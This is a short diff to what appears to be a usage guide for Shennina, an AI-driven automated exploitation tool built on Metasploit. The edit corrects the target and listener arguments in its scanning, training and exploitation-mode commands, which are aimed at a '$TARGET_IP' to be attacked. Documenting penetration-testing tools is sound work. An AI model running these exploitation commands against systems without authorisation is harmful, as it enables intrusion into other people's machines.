@@ -31,15 +31,15 @@ sudo ./run-server.sh
 ./shennina.py --initialize-exploits-tree
 
 
-#------ scanning phase------#
+#------ scanning phase------# (Replace $TARGET_IP with the IP which is to be attacked). 127.0.0.1 is the kali localhost that runs metasplpit RPC. Otherwise you define another IP.
 
-sudo ./shennina.py --lhost metasploit-ip --target target.local --service-scan-only
+sudo ./shennina.py --lhost 127.0.0.1 --target $TARGET_IP --service-scan-only
 
 # ------------- training shennina ------------------#
-sudo ./shennina.py --target 127.0.0.1 --lhost $target_IP --training-mode
+sudo ./shennina.py --target $TARGET_IP --lhost 127.0.0.1 --training-mode
 
 # --------------- attacking with recommended exploit given by shennina AI -------------------#
-sudo ./shennina.py --target 127.0.0.1 --lhost $target_IP --exploitation-mode
+sudo ./shennina.py --target $TARGET_IP --lhost 127.0.0.1 --exploitation-mode
 
 
 
